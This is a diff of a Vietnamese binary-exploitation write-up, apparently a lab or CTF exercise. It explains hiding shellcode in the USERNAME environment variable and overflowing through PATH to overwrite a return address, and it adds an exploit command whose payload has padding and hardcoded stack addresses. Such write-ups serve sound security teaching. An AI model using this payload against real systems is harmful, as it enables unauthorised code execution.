@@ -92,7 +92,7 @@ main() {
 }
 GetEnv() {
 	Tạo struct env;
-Lấy địa chỉ struct env ảo của hàm main ở ebp + 0x8 và copy struct env vào struct env ảo ở hàm main;
+	Lấy địa chỉ struct env ảo của hàm main ở ebp + 0x8 và copy struct env vào struct env ảo ở hàm main;
 }
 ```
 
@@ -130,6 +130,8 @@ _start:
 Cuối cùng là đặt chúng vào 1 trong 4 biến môi trường và return. Trong 4 biến thì chỉ có `USERNAME` là chưa có giá trị sẵn, vì vậy mình sẽ đặt shellcode vào biến `USERNAME`, và đè return address về địa chỉ struct ENV ảo + 0x80 (vị trí của `env.username`). Biến `PATH` là biến cuối cùng để overflow vì thế chắc chắn sẽ phải thay đổi, mình sẽ không sửa toàn bộ mà chỉ thêm vào phía sau để đảm bảo chương trình không bị ảnh hưởng. Vị trí của biến PATH là `ebp - 0x21c + 0x180 = ebp – 0x9c`. Địa chỉ của struct ENV ảo có thể là bất kì vùng nhớ nào có quyền read, mình debug gdb và lấy luôn giá trị cũ cho chắc cú.
 
 ![](images/7.png)
+
+Exploit:
 
 ```bash
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/`python2 -c "print 'A' * 41 + '\x70\xf6\xff\xbf' + '\xf0\xf5\xff\xbf'"`
